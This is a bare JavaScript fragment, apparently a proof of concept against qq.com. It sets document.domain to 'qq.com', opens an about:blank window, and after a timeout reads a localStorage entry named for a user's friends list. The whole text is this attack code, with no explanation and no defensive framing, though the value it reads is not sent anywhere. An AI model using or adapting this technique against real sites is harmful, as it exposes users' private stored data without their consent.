document.domain="qq.com";
function openProxy(){
  var a = window.open("about:blank");
  a.onload = function(){
    a.localStorage.getItem("app_friends_649114132");
  }
}
setTimeout('openProxy()',4000);

